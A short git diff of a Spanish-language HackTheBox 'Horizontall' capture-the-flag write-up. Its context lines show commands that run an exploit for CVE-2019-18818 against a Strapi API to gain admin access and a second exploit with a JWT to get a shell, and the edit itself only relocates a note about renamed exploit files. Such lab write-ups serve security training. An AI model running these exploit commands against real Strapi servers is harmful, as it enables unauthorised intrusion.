@@ -215,8 +215,6 @@ any0ne@Pentesting:~$ python3 exploit-CVE-2019-18818.py http://api-prod.horizonta
 
 ![Strapi Exploited](/assets/images/hackthebox/horizontall/strapi_exploit.png)
 
-> NOTA: En la imagen se ven otros nombres porque yo cambié los nombres a los exploits por comodidad.
-
 Ahora que tenemos acceso como administrador, vamos a iniciar sesión y ver qué nos encontramos.
 
 ![Strapi Admin](/assets/images/hackthebox/horizontall/strapi_admin.png)
@@ -230,6 +228,8 @@ any0ne@Pentesting:~$  python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbG
 ```
 
 ![Strapi Shell](/assets/images/hackthebox/horizontall/got_shell.png)
+
+> NOTA: Disculpas por la calidad de la imagen. En la imagen se ven otros nombres porque yo cambié los nombres a los exploits por comodidad.
 
 Ejecutamos **`whoami`** para ver qué usuario somos en el sistema, luego nos movemos hasta **`/home/developer/`** y tenemos la flag de usuario en **`user.txt`**
 
